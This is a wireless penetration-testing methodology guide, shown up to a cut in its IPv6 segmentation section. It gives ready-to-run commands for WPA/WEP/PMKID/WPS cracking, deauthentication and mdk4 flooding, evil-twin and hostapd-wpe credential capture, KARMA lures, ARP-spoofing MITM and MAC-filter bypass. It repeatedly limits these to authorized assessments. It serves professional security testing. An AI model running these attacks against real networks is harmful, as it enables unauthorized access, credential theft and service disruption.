# Wireless Penetration Testing Guide

**Source:** Wireless (WiFi) Penetration Testing Checklist v1.0  
**Merged from:** methodology cheatsheet + common-findings how-to  
**Version:** 1.1  
**Use:** Authorized assessments only. Confirm Rules of Engagement (RoE) before any active attack (deauth, rogue AP, credential capture, DoS).

---

## Table of Contents

1. [Variables & Prerequisites](#1-variables--prerequisites)
2. [Quick Lab Setup](#2-quick-lab-setup)
3. [Reconnaissance](#3-reconnaissance)
4. [Identify Wireless Networks](#4-identify-wireless-networks)
5. [Classic Attack Flow (Place → Discover → Select → Capture)](#5-classic-attack-flow-place--discover--select--capture)
6. [WEP Assessment](#6-wep-assessment)
7. [WPA / WPA2 (PSK) Assessment](#7-wpa--wpa2-psk-assessment)
8. [PMKID Attack](#8-pmkid-attack)
9. [WPA3 Notes](#9-wpa3-notes)
10. [WPS Assessment](#10-wps-assessment)
11. [LEAP Encrypted WLAN](#11-leap-encrypted-wlan)
12. [Unencrypted / Open WLAN](#12-unencrypted--open-wlan)
13. [DoS / Disruption Tests](#13-dos--disruption-tests)
14. [Rogue AP / Evil Twin / KARMA](#14-rogue-ap--evil-twin--karma)
15. [Enterprise / 802.1X / Certificate Validation](#15-enterprise--8021x--certificate-validation)
16. [Captive Portal Testing](#16-captive-portal-testing)
17. [MITM & Protocol Attacks](#17-mitm--protocol-attacks)
18. [Authentication Testing](#18-authentication-testing)
19. [Post-Auth Network Enumeration](#19-post-auth-network-enumeration)
20. [VLAN & Segmentation Testing](#20-vlan--segmentation-testing)
21. [Wireless Management-Plane Security](#21-wireless-management-plane-security)
22. [PSK Policy Assessment](#22-psk-policy-assessment)
23. [Network Protocol Testing](#23-network-protocol-testing)
24. [RF Coverage & WIDS/WIPS](#24-rf-coverage--widswips)
25. [Common Findings — How to Find Each One](#25-common-findings--how-to-find-each-one-steps--commands)
26. [Tool & Command Reference](#26-tool--command-reference)
27. [References](#27-references)

---

## 1. Variables & Prerequisites

Replace placeholders consistently:

| Variable | Meaning |
|---|---|
| `wlan0` | Managed-mode interface |
| `wlan0mon` | Monitor-mode interface |
| `<BSSID>` | AP MAC (e.g. `AA:BB:CC:DD:EE:FF`) |
| `<CLIENT>` | Station/client MAC |
| `<SSID>` | Network name |
| `<CH>` | Channel (`1`–`14`, `36`, `149`, etc.) |
| `<IFACE>` | Monitor interface |
| `<CTRL_IP>` | Controller / AP management IP |
| `<RANGE>` | Target subnet (e.g. `192.168.1.0/24`) |
| `capture.cap` | Packet capture file |
| `wordlist.txt` | Password wordlist (`rockyou.txt`, custom, etc.) |

Typical packages (Kali):

```bash
sudo apt update
sudo apt install -y aircrack-ng hcxdumptool hcxtools hashcat reaver bully \
  macchanger nmap arp-scan bettercap ettercap-text-only wireshark tshark \
  kismet hostapd hostapd-wpe asleap crunch hping3 snmp onesixtyone \
  iw wireless-tools net-tools
```

Check adapter support (monitor + injection):

```bash
iw list | grep -A 20 "Supported interface modes"
sudo aireplay-ng --test wlan0mon
```

Kill interfering processes before monitor mode:

```bash
sudo airmon-ng check kill
# later restore:
# sudo systemctl start NetworkManager
```

---

## 2. Quick Lab Setup

```bash
# Identify adapters
iwconfig
ip link
iw dev

# Put card into monitor mode
sudo airmon-ng start wlan0
# or:
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Confirm
iwconfig
iw dev

# MAC spoof (if authorized / NAC bypass test)
sudo ip link set wlan0 down
sudo macchanger -m 00:11:22:33:44:55 wlan0
# random MAC:
sudo macchanger -r wlan0
sudo ip link set wlan0 up

# Restore managed mode
sudo airmon-ng stop wlan0mon
sudo systemctl start NetworkManager
```

---

## 3. Reconnaissance

### Test cases from checklist

- Discover devices
- Identify hidden access points
- Identify encryption (WPA / WPA2 / WPA3 / WPS / Open)
- Sniff packets on unencrypted networks
- Guess weak passwords (authorized only)
- Obtain authorized SSID list
- Identify corporate SSIDs
- Identify guest SSIDs
- Scan 2.4 GHz / 5 GHz / 6 GHz
- Identify WPA / WPA2 / WPA3 usage

### Commands

```bash
# Broad survey (all channels)
sudo airodump-ng wlan0mon

# Band-specific
sudo airodump-ng --band abg wlan0mon          # 2.4 + 5 GHz
sudo airodump-ng --band b wlan0mon            # 2.4 GHz
sudo airodump-ng --band a wlan0mon            # 5 GHz

# Write CSV/pcap for inventory
sudo airodump-ng -w recon --output-format csv,pcap wlan0mon

# Lock to one AP
sudo airodump-ng -c <CH> --bssid <BSSID> -w target wlan0mon

# Hidden SSID: wait for a client probe / association, or deauth a client
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon
# SSID often appears in airodump ESSID column after association frames

# GUI / wardrive-style discovery
sudo kismet -c wlan0mon

# Beacon / cipher inspection
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 0x08" -T fields \
  -e wlan.ssid -e wlan.bssid -e wlan.rsn.akms.type -e wlan.rsn.pcs.type

# Wireshark display filters
# wlan.fc.type_subtype == 8          Beacon
# wlan.ssid == "<SSID>"
# eapol
# wlan.fc.type_subtype == 4          Probe request (PNL / loud-mouth)
```

**What to record**

| Field | Why |
|---|---|
| BSSID | Target AP identity |
| ESSID | Corporate vs guest vs IoT vs hidden |
| CH / freq | 2.4 / 5 / 6 GHz coverage |
| ENC / CIPHER / AUTH | OPEN, WEP, WPA, WPA2, WPA3, MGT, PSK, TKIP, CCMP |
| PWR | RF bleed / coverage |
| #Data / Beacons | Traffic volume |
| Stations | Clients for handshake / deauth |
| WPS | wash output |

---

## 4. Identify Wireless Networks

```bash
# Monitor mode
sudo airmon-ng start wlan0

# Channel scan
sudo airodump-ng wlan0mon
sudo airodump-ng --channel 1,6,11 wlan0mon

# Channel hop manually
sudo iwconfig wlan0mon channel <CH>
```

References from checklist:

- https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet
- https://purplesec.us/perform-wireless-penetration-test/

---

## 5. Classic Attack Flow (Place → Discover → Select → Capture)

This is the spreadsheet’s condensed Aircrack-ng workflow.

```bash
# PLACE — monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# DISCOVER — BSSID, channel, clients, encryption
sudo airodump-ng wlan0mon

# SELECT — lock channel + capture
sudo airodump-ng -c <CH> --bssid <BSSID> -w handshake wlan0mon

# SELECT — deauth a client to force handshake
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon
# broadcast deauth (noisier, often detected)
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon

# CAPTURE — crack handshake
sudo aircrack-ng -w wordlist.txt -b <BSSID> handshake-01.cap
```

Wordlist generation (checklist: crunch):

```bash
# Example: 8-char lowercase + digits
crunch 8 8 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt

# Pattern-based (company year, etc.) — authorized policy testing only
crunch 10 10 -t Corp%%%%20 -o corp.txt
```

Fake authentication (WEP / some open AP tests):

```bash
sudo aireplay-ng -1 0 -a <BSSID> -h <YOUR_MAC> wlan0mon
```

---

## 6. WEP Assessment

### Test cases

- Visible vs hidden SSID
- Sniff + inject
- Crack with Aircrack-ng / WEPcrack
- Deauth hidden-SSID clients
- OPN vs SKA (Shared Key Authentication)
- Client present: ARP replay / interactive replay (IVs)
- No client: fragmentation or KoreK chopchop → keystream → forged ARP

### Commands

```bash
# Discover
sudo airodump-ng --encrypt WEP wlan0mon
sudo airodump-ng -c <CH> --bssid <BSSID> -w wep wlan0mon

# Fake auth
sudo aireplay-ng -1 0 -e "<SSID>" -a <BSSID> -h <YOUR_MAC> wlan0mon

# ARP replay (clients associated)
sudo aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> wlan0mon

# Interactive replay
sudo aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <BSSID> -h <YOUR_MAC> wlan0mon

# KoreK chopchop — generate PRGA / .xor
sudo aireplay-ng -4 -b <BSSID> -h <YOUR_MAC> wlan0mon
# -4  chopchop
# -b  AP MAC
# -h  source MAC (usually yours)

# Fragmentation attack (no client)
sudo aireplay-ng -5 -b <BSSID> -h <YOUR_MAC> wlan0mon

# Forge ARP from PRGA
packetforge-ng -0 -a <BSSID> -h <YOUR_MAC> \
  -k 255.255.255.255 -l 255.255.255.255 \
  -y fragment-XXXX-XX-XX-XX-XX-XX.xor \
  -w arp-forged.cap
# -0 ARP request
# -a AP MAC
# -h source MAC
# -k dest IP ("Who has")
# -l source IP ("Tell")
# -y PRGA file
# -w output packet

# Inject forged packet
sudo aireplay-ng -2 -r arp-forged.cap wlan0mon

# Crack when enough IVs (~20k–50k+ typical)
aircrack-ng -b <BSSID> wep-01.cap
```

SKA bypass research note from checklist:  
https://lesperance.io/bypassing-wep-shared-key-authentication/

---

## 7. WPA / WPA2 (PSK) Assessment

### Test cases

- Deauthenticate client
- Capture EAPOL 4-way handshake
- Dictionary attack (aircrack-ng, coWPAtty, hashcat)
- Rainbow / precomputed PMK (`genpmk`)
- Retry capture if handshake incomplete
- KRACK check (authorized lab / explicit RoE)

### Handshake capture

```bash
sudo airodump-ng -c <CH> --bssid <BSSID> -w wpa wlan0mon
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon

# Verify EAPOL in capture
tshark -r wpa-01.cap -Y eapol
aircrack-ng wpa-01.cap
```

### Crack PSK

```bash
# CPU — aircrack-ng
aircrack-ng -w wordlist.txt -b <BSSID> wpa-01.cap

# coWPAtty
cowpatty -r wpa-01.cap -f wordlist.txt -s "<SSID>"

# Precomputed PMK / rainbow-style
genpmk -f wordlist.txt -d hashes.genpmk -s "<SSID>"
cowpatty -r wpa-01.cap -d hashes.genpmk -s "<SSID>"

# GPU — hashcat mode 22000
hcxpcapngtool -o hash.22000 wpa-01.cap
hashcat -m 22000 hash.22000 wordlist.txt
hashcat -m 22000 hash.22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

### KRACK

Only in authorized lab against in-scope APs:

```bash
# https://github.com/vanhoefm/krackattacks-scripts
git clone https://github.com/vanhoefm/krackattacks-scripts
```

---

## 8. PMKID Attack

Does not require a connected client on many WPA/WPA2-PSK APs.

```bash
# Capture
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=15

# Or filter to one AP
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=15 --filterlist_ap=ap.txt --filtermode=2

# Convert
hcxpcapngtool -o hash.22000 pmkid.pcapng

# Crack
hashcat -m 22000 hash.22000 wordlist.txt
```

Alternative (older):

```bash
sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng
```

---

## 9. WPA3 Notes

- Identify from airodump `ENC/CIPHER` and RSN AKM in beacons (SAE).
- WPA3-Personal uses SAE; classic 4-way handshake dictionary against captured frames does not apply the same way as WPA2-PSK.
- Transition mode (WPA2/WPA3 mixed) may still allow WPA2-PSK attacks against the WPA2 path.
- Dragonblood / SAE issues are version- and implementation-specific — confirm firmware and lab conditions before testing.
- Prefer documenting: SAE vs transition mode, PMF required/optional, downgrade to WPA2.

```bash
tshark -i wlan0mon -Y "wlan.fc.type_subtype == 8" -V | grep -i -E "AKM|SAE|SHA256|PMF|Management Frame Protection"
```

---

## 10. WPS Assessment

### Test cases

- WPS enabled?
- WPS configuration / required?
- Can WPS be disabled?
- Exposed on corporate vs guest?
- Administrative controls present?

### Commands

```bash
# Scan WPS
sudo wash -i wlan0mon
sudo wash -i wlan0mon -5          # 5 GHz if supported

# Reaver PIN attack
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -N -d 5 -T 2

# Pixie Dust
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K
sudo bully -b <BSSID> -c <CH> -d wlan0mon

# Lockout-aware / delayed
sudo bully -b <BSSID> -c <CH> -l 10 -v wlan0mon
```

Finding to flag: WPS enabled on corporate or guest SSIDs with no operational need.

---

## 11. LEAP Encrypted WLAN

```bash
# Confirm LEAP / EAP type in beacons or EAP exchange
tshark -r capture.cap -Y "eap" -V

# Deauth client to recapture challenge/response
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon

# Crack MSCHAPv2 / LEAP
asleap -r capture.cap -W wordlist.txt
asleap -C <challenge> -R <response> -W wordlist.txt

# hashcat MSCHAPv2
hashcat -m 5500 hash.txt wordlist.txt
```

Tools also used for client lure: Karma, Hotspotter (see Evil Twin section).

---

## 12. Unencrypted / Open WLAN

### Test cases

- Visible vs hidden SSID
- Sniff IP range
- MAC filtering present?
- Spoof allowed MAC
- Connect using discovered addressing
- Reveal hidden SSID then treat as visible

```bash
sudo airodump-ng --encrypt OPN wlan0mon
sudo airodump-ng -c <CH> --bssid <BSSID> -w open wlan0mon

# Reveal hidden SSID
sudo aireplay-ng --deauth 15 -a <BSSID> -c <CLIENT> wlan0mon

# Sniff DHCP / ARP / IPs
sudo tshark -i wlan0mon -Y "bootp or arp or dns"
sudo tcpdump -i wlan0mon -n port 67 or port 68

# MAC filter bypass test
sudo ip link set wlan0 down
sudo macchanger -m <ALLOWED_CLIENT_MAC> wlan0
sudo ip link set wlan0 up

# Associate (managed mode) and request DHCP
sudo iwconfig wlan0 essid "<SSID>"
sudo dhclient -v wlan0
ip addr
ip route
```

---

## 13. DoS / Disruption Tests

**Only if RoE explicitly allows denial of service.**

| Test | Intent | Example |
|---|---|---|
| Deauth / disassoc | Disconnect all or one client | `aireplay-ng --deauth` |
| Random fake APs | Hide nets / confuse scanners | `mdk4` / `airbase-ng` |
| Overload AP | Auth / assoc flood | `mdk4 a` / `mdk3` |
| WIDS | Trigger / evaluate IDS | rogue beacons, deauth bursts |
| TKIP / EAPOL quirks | Vendor-specific crashes | lab only |

```bash
# Targeted deauth
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT> wlan0mon

# Broadcast deauth
sudo aireplay-ng --deauth 20 -a <BSSID> wlan0mon

# mdk4 examples (if installed and authorized)
sudo mdk4 wlan0mon d -B <BSSID>
sudo mdk4 wlan0mon b -a <BSSID>
sudo mdk4 wlan0mon a -a <BSSID>
sudo mdk4 wlan0mon w -e "<SSID>" -z
```

Document WIDS/WIPS alerts, time-to-detect, and operator response.

---

## 14. Rogue AP / Evil Twin / KARMA

### Test cases

- Active impersonation **only when explicitly authorized**
- Can corporate SSIDs be imitated?
- Do clients auto-join previously trusted networks?
- Client certificate validation
- Enterprise auth configuration
- WIDS/WIPS detection and rogue-AP alerting
- Response procedures
- Would an impersonating AP attract authorized clients?
- Do **not** collect credentials unless authorized
- Do **not** retain unnecessary authentication material

### Open / captive-portal evil twin

Useful to test captive portal creds and LAN attacks (authorized).

```bash
sudo airbase-ng -e "<SSID>" -c <CH> wlan0mon
# Then NAT / DHCP on at0 if your lab design requires it
```

### WPA-PSK evil twin

Useful for network attacks **if you already know the PSK** (authorized).

```bash
# hostapd.conf snippet
# interface=wlan0
# driver=nl80211
# ssid=<SSID>
# hw_mode=g
# channel=<CH>
# wpa=2
# wpa_passphrase=<KNOWN_PSK>
# wpa_key_mgmt=WPA-PSK
# rsn_pairwise=CCMP
sudo hostapd hostapd-psk.conf
```

### WPA-Enterprise / MGT evil twin (credential capture)

Useful to capture company credentials **only if RoE allows**.

```bash
sudo hostapd-wpe hostapd-wpe.conf
# Review hostapd-wpe log for EAP type, identity, challenge/response
```

### KARMA / MANA / PNL (loud-mouth)

- KARMA: devices auto-connect to previously trusted SSIDs.
- Loud-mouth / PNL: probe requests leak historical SSIDs.

```bash
sudo hostapd-mana mana.conf

# Collect preferred network list from probes
sudo airodump-ng wlan0mon --output-format csv -w probes
sudo tshark -i wlan0mon -Y "wlan.fc.type_subtype == 4" -T fields \
  -e wlan.sa -e wlan.ssid
```

---

## 15. Enterprise / 802.1X / Certificate Validation

### Test cases

- Clients validate RADIUS server certificate
- Insecure EAP (PEAP/MSCHAPv2 without validation, LEAP, EAP-PWD misconfig)
- Expired / revoked client or server certs still accepted (EAP-TLS lifecycle)
- Weak enterprise authentication
- Guest vs corporate credential reuse

```bash
# Observe EAP method
sudo tshark -i wlan0mon -Y eap -V
sudo tshark -r capture.cap -Y "eap.type" -T fields -e eap.type -e eap.identity

# Rogue RADIUS / hostapd-wpe to test whether clients warn / refuse
sudo hostapd-wpe hostapd-wpe.conf

# Crack captured MSCHAPv2 if validation was missing (authorized)
asleap -C <challenge> -R <response> -W wordlist.txt
hashcat -m 5500 netntlm.txt wordlist.txt
```

**Pass condition examples**

- Client rejects untrusted/mismatched RADIUS cert
- EAP-TLS rejects expired or revoked certs
- Guest identities cannot bind to corporate SSID

---

## 16. Captive Portal Testing

### Test cases

- Auth flow, session handling, authorization
- MAC spoofing around portal
- DNS tunneling / DNS policy bypass on guest
- Session persistence after logout / idle
- Insecure guest portal (HTTP, mixed content, open redirect)

```bash
# Baseline connect
sudo dhclient -v wlan0
curl -vk http://neverssl.com
curl -vk http://captive.apple.com/hotspot-detect.html

# MAC spoof to clone an authorized/post-auth client
sudo macchanger -m <POST_AUTH_MAC> wlan0
sudo dhclient -v wlan0

# DNS bypass / tunneling checks (policy test — do not exfiltrate real data)
dig @8.8.8.8 example.com
dig @1.1.1.1 example.com
nslookup corp-internal.local
# Compare guest DNS vs direct public resolvers

# Bettercap DNS spoof (MITM lab, authorized)
sudo bettercap -iface wlan0
# set dns.spoof.domains example.com
# dns.spoof on
```

---

## 17. MITM & Protocol Attacks

```bash
# bettercap
sudo bettercap -iface wlan0
# net.probe on
# net.recon on
# set arp.spoof.targets <target>
# arp.spoof on
# net.sniff on

# Ettercap ARP
sudo ettercap -T -M arp:remote /<GATEWAY>/ /<TARGET>/

# Packet analysis
sudo wireshark
sudo tshark -i wlan0 -w lan.pcap
sudo tshark -i wlan0mon -Y "eapol"
```

---

## 18. Authentication Testing

### Test cases

- Auth to intended SSID
- Auth from each authorized location
- Intended authentication method works
- Incorrect credentials rejected
- Expired / disabled accounts rejected
- Unauthorized accounts cannot authenticate
- Guest credentials do **not** work on corporate WLANs
- Corporate credentials do **not** unnecessarily work on guest WLANs

Record method (PSK, EAP-TLS, PEAP, captive portal), failure messages, lockout, and logging.

```bash
# PSK join test (managed mode)
nmcli dev wifi connect "<SSID>" password "<PSK>" ifname wlan0
# or
wpa_supplicant -i wlan0 -c wpa_supplicant.conf -d
```

---

## 19. Post-Auth Network Enumeration

### Record

- Assigned IP
- Subnet mask / prefix
- Default gateway
- DNS servers
- DHCP server

```bash
ip -4 addr
ip -6 addr
ip route
ip -6 route
resolvectl status
cat /etc/resolv.conf
nmcli dev show wlan0
```

### Identify

- Accessible segments
- Reachable infrastructure
- Exposed services
- Management interfaces
- Auth infrastructure (RADIUS, AD, LDAP, IdP)
- Broadcast services
- File sharing
- Admin services
- Printers
- IoT
- Network gear
- Unexpected routing paths

```bash
# L2/L3 discovery
sudo arp-scan -l -I wlan0
sudo nmap -sn <RANGE>
sudo nmap -sn --script broadcast-dhcp-discover
ip neigh

# Service / version
sudo nmap -sV -p- --open <TARGET>
sudo nmap -sV -p 22,23,80,161,443,445,3389,8080,8443 <RANGE>

# Broadcast / name resolution exposure (Windows clients)
sudo nmap --script broadcast-nbstat,llmnr-resolve <RANGE>
sudo tcpdump -i wlan0 -n port 137 or port 138 or port 5355

# IPv6
sudo nmap -6 -sn <IPv6_RANGE>
sudo rdisc6 wlan0
ip -6 neigh
```

---

## 20. VLAN & Segmentation Testing

### Guest WLAN isolation

- Corporate network
- Server network
- Management network
- IoT
- Client-to-client
- Internal DNS restrictions
- Internal routing restrictions

Also: guest-to-corporate, IoT pivot, IPv6 bypass, LLMNR/NBNS leak, DNS policy bypass.

```bash
# Reachability from guest / IoT SSID
ping -c 2 <CORP_GW>
ping -c 2 <DC_IP>
ping -c 2 <MGMT_IP>
ping -c 2 <IOT_GW>

sudo nmap -sn <CORP_RANGE>
sudo nmap -sV <CORP_RANGE>
sudo arp-scan --interface=wlan0 <CORP_RANGE>
sudo nmap -6 -sn <CORP_V6>

# Client isolation: can you see other guest MACs / ports?
sudo arp-scan -l -I wlan0
sudo nmap -sn <GUEST_RANGE>

# DNS restriction
dig @<INTERNAL_DNS> dc.corp.local
dig @8.8.8.8 corp.internal
```

---

## 21. Wireless Management-Plane Security

### Test cases

- HTTPS administration only
- Unnecessary HTTP
- SSH config
- Telnet exposure
- SNMP exposure
- Management API
- Admin auth / MFA / authorization
- Session timeout / logging
- Management-source restrictions
- Default / unused / privileged accounts
- Password policy
- Authorized AP inventory vs observed BSSIDs
- Duplicate corporate SSIDs
- Unauthorized APs, hotspots, repeaters
- Suspicious signal patterns
- WIDS/WIPS detection

```bash
sudo nmap -p 22,23,80,161,443,8080,8443 <CTRL_IP>
sudo nmap -sV -p 22,23,80,161,443,8080,8443 <CTRL_IP>

# SNMP
snmpwalk -v2c -c public <CTRL_IP>
onesixtyone -c community.txt <CTRL_IP>

# Inventory compare
sudo airodump-ng -w inventory --output-format csv wlan0mon
sudo kismet -c wlan0mon
# Diff observed BSSID/SSID against authorized asset list
```

Default credential checks: vendor AP/controller docs + hydra/ncrack **only if authorized**.

---

## 22. PSK Policy Assessment

Authorized review only (do not attack production passwords without written approval).

- Password policy strength
- Reuse across SSIDs
- Reuse between wireless and other services
- Guest vs corporate credentials differ
- Credentials not exposed on management interfaces

```bash
sudo nmap -p 22,23,80,161,443,8080 <CTRL_IP>
# Manual admin portal review for posted PSKs, QR codes, guest lists
```

---

## 23. Network Protocol Testing

| Test | Typical commands |
|---|---|
| IPv4 isolation | `nmap -sn`, `nmap -sV <RANGE>`, `arp-scan -l`, ping sweep |
| IPv6 isolation | `nmap -6 -sn`, `rdisc6` |
| Traffic capture | `tshark`, `wireshark`, `tcpdump` |
| Crypto analysis | inspect TLS/EAP/RSN in Wireshark |
| Unknown protocol decode | Wireshark dissectors / `tshark -V` |
| Protocol enumeration | `nmap -sV`, SNMP, mDNS, SSDP |
| Fuzzing / exploitation | only with explicit RoE and isolated lab |

```bash
sudo tcpdump -i wlan0 -w proto.pcap
sudo tshark -r proto.pcap -q -z io,phs
sudo nmap -sV --script discovery <RANGE>
```

---

## 24. RF Coverage & WIDS/WIPS

```bash
# Signal vs location (walk the perimeter)
sudo airodump-ng wlan0mon
# Record PWR outside building line, parking, adjacent floors

# Suspicious patterns / extra BSSIDs
sudo kismet -c wlan0mon
```

Document:

- Coverage beyond intended boundary
- Same SSID on unexpected BSSIDs
- Personal hotspots / repeaters
- Whether WIDS alerted on deauth, evil twin, or off-hours APs

---

## 25. Common Findings — How to Find Each One (Steps + Commands)

Use this as the explicit findings pass. Each item: what to look for, commands, and when it is a finding.

Authorized testing only. Replace placeholders before running.

```bash
IFACE=wlan0
MON=wlan0mon
BSSID=AA:BB:CC:DD:EE:FF
CLIENT=11:22:33:44:55:66
CH=6
SSID="CorpWiFi"
GUEST_SSID="Corp-Guest"
IOT_SSID="Corp-IoT"
WORDLIST=/usr/share/wordlists/rockyou.txt
CTRL=192.168.1.5          # WLC / cloud connector / AP VIP
DC=10.10.10.10
FS=10.10.10.20
CORP_RANGE=10.10.0.0/16
GUEST_RANGE=10.50.0.0/16
IOT_RANGE=10.60.0.0/16
MGMT_RANGE=10.255.0.0/24
GW=10.50.0.1
```

One-time radio setup used by most checks:

```bash
airmon-ng check kill
airmon-ng start $IFACE
iwconfig $MON
```

When a check says **join SSID**, use a provided test account / PSK, then:

```bash
nmcli dev wifi connect "$SSID" password "$PSK" ifname $IFACE
ip -4 addr; ip -6 addr; ip route; cat /etc/resolv.conf
```

---

### 1. Weak Wi-Fi password

**What you are looking for:** PSK recovered from a captured handshake or PMKID with a normal wordlist or light rules.

**Steps**

1. Survey and pick the PSK SSID (not Enterprise `AUTH MGT`).
2. Capture a 4-way handshake or a PMKID.
3. Convert and crack offline.

```bash
airodump-ng --bssid $BSSID -c $CH -w hsk $MON
aireplay-ng --deauth 8 -a $BSSID -c $CLIENT $MON
tshark -r hsk-01.cap -Y eapol
hcxpcapngtool -o hash.22000 hsk-01.cap
hashcat -m 22000 hash.22000 $WORDLIST
hashcat -m 22000 hash.22000 $WORDLIST -r /usr/share/hashcat/rules/best64.rule
```

PMKID alternative (often no deauth):

```bash
hcxdumptool -i $MON -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.22000 pmkid.pcapng
hashcat -m 22000 hash.22000 $WORDLIST
```

**Found when:** hashcat status is `Cracked`. Report pattern (length, charset), not the live secret unless the client requires it.

---

### 2. Password reused across SSIDs

**What you are looking for:** same PSK on guest, corp-personal, IoT, voice, or site-to-site SSIDs.

**Steps**

1. Recover or obtain (from client) the PSK for SSID A.
2. Try that exact PSK on every other in-scope PSK SSID.
3. Also compare hashes: if two SSIDs share the same ESSID+PSK, PMK matches; if ESSID differs, PSK string can still be identical.

```bash
nmcli dev wifi connect "$GUEST_SSID" password "$RECOVERED_PSK" ifname $IFACE
nmcli dev wifi connect "$IOT_SSID"   password "$RECOVERED_PSK" ifname $IFACE
nmcli dev wifi connect "$SSID"       password "$RECOVERED_PSK" ifname $IFACE
```

**Found when:** one secret opens more than one SSID.

---

### 3. Password shared excessively

**What you are looking for:** PSK written on reception boards, meeting-room TV cards, printers, onboarding PDFs, or given to every visitor without rotation.

**Steps (non-RF)**

1. Ask how a new guest gets the key.
2. Photograph any posted key (if allowed) or note the process.
3. Count how many people / vendors know the corporate PSK.

**Found when:** a “secret” is treated like a building Wi-Fi poster. No packet command required.

---

### 4. Password never rotated

**What you are looking for:** PSK older than policy (90/180 days) or never changed since install.

**Steps**

1. Ask for last PSK-change ticket / controller “PSK last modified”.
2. If you cracked it, check whether it matches a default or an old campaign name (`Company2019`).
3. Compare current PSK to the one in last year’s pentest report (client-provided).

```bash
# controller / cloud CLI examples vary by vendor
# Cisco WLC:
# show wlan <id>
# Aruba:
# show wlan ssid-profile <name>
```

**Found when:** no change record, or PSK still matches an old artifact.

---

### 5. WPA/WPA2 legacy configuration

**What you are looking for:** WPA1, WPA2-only, or WPA2+WPA3 transition when the estate could be WPA3-only + PMF required.

```bash
airodump-ng $MON
# ENC / CIPHER / AUTH columns
airodump-ng --bssid $BSSID -c $CH -w beacon $MON
tshark -r beacon-01.cap -Y "wlan.fc.type_subtype == 8" -V | grep -A80 "RSN Information"
```

**Found when:** `WPA` without `WPA2`, or WPA2-PSK with PMF disabled, or transition mode still offering WPA2-PSK to all clients.

---

### 6. Weak encryption / TKIP enabled

```bash
airodump-ng $MON
# CIPHER column shows TKIP or TKIP+CCMP
```

Wireshark: beacon RSN pairwise / group cipher = TKIP (0x000fac02).

**Found when:** any production SSID advertises TKIP.

---

### 7. WPS unnecessarily enabled

```bash
wash -i $MON
# columns: BSSID, Ch, WPS, Lck, Vendor, ESSID
```

If RoE allows a proof (Pixie-Dust / PIN), and lockout is off:

```bash
reaver -i $MON -b $BSSID -c $CH -K 1 -vv
# or
bully -b $BSSID -c $CH -d
```

**Found when:** `wash` shows WPS `Yes` on a production SSID, especially `Lck No`. The existence of WPS is already the finding; cracking is optional evidence.

---

### 8. Open corporate WLAN

```bash
airodump-ng $MON
# ENC = OPN on an SSID that carries business users or the company name
nmcli dev wifi connect "$SSID" ifname $IFACE
```

**Found when:** you associate with no PSK / no 802.1X and get a DHCP address on a corporate-named SSID.

---

### 9. Missing client isolation (peer-to-peer)

**Steps**

1. Join the SSID with tester laptop A. Note IP.
2. Join the same SSID with tester laptop B (or phone). Note IP.
3. From A, probe B.

```bash
ping -c 3 $OTHER_STA_IP
arping -I $IFACE $OTHER_STA_IP
nmap -sS -F $OTHER_STA_IP
nmap -p 445,139,22,80,3389 $OTHER_STA_IP
```

**Found when:** echo replies, ARP replies, or open ports on the other station. Guest and IoT should almost always fail this test.

---

### 10. Missing guest isolation (guest VLAN not contained)

Same as §11–15 but starting from the **guest** SSID. If guest can see *any* non-guest subnet, isolation is missing.

```bash
nmcli dev wifi connect "$GUEST_SSID" password "$GUEST_PSK" ifname $IFACE
ip route
nmap -sn $CORP_RANGE $MGMT_RANGE $IOT_RANGE
```

---

### 11. Guest-to-corporate access

```bash
nmcli dev wifi connect "$GUEST_SSID" password "$GUEST_PSK" ifname $IFACE
ping -c 2 $DC
nmap -sn $CORP_RANGE
nmap -sS -p 22,80,88,389,443,445,636,3389 $DC $FS
curl -vk https://intranet.corp.local --connect-timeout 5
dig @$DC intranet.corp.local
```

**Found when:** host-up, open ports, or DNS/HTTP response from a corporate system.

---

### 12. IoT-to-corporate access

```bash
nmcli dev wifi connect "$IOT_SSID" password "$IOT_PSK" ifname $IFACE
nmap -sn $CORP_RANGE
nmap -sS -p 22,80,443,445,3389,88,389 $DC $FS
```

**Found when:** camera/printer VLAN can reach AD, file servers, or user desktops.

---

### 13. Wireless-to-management access

From guest **and** corp **and** IoT:

```bash
nmap -p 22,23,80,161,443,8080,8443 $CTRL
nmap -sV -p 22,23,80,161,443,8080,8443 $MGMT_RANGE
curl -vk http://$CTRL/
curl -vk https://$CTRL/
```

**Found when:** AP/WLC/switch GUI or SSH answers from a user/guest wireless address.

---

### 14. Wireless-to-server access

```bash
nmap -sS -p 22,80,443,445,1433,3306,3389 $FS $APP1 $APP2
```

**Found when:** production servers accept traffic sourced from wireless SVIs that should only reach the internet or a jump subnet.

---

### 15. Wireless-to-security-infrastructure access

Typical targets: NVR, cameras, badge panels, alarms, building BMS.

```bash
nmap -sS -p 80,443,554,37777,8000,8080,34567 $CAM_RANGE
# RTSP often 554; many NVRs 80/443
```

**Found when:** camera web UI or RTSP is reachable from guest or user Wi-Fi.

---

### 16. IPv6 segmentation bypass

IPv4 ACLs often exist; IPv6 RA/SLAAC is forgotten.

```bash
ip -6 addr show $IFACE
ip -6 route
rdisc6 $IFACE
nmap -6 -sn fe80::/64
# if you learn a global prefix (e.g. 2001:db8:10::/64)
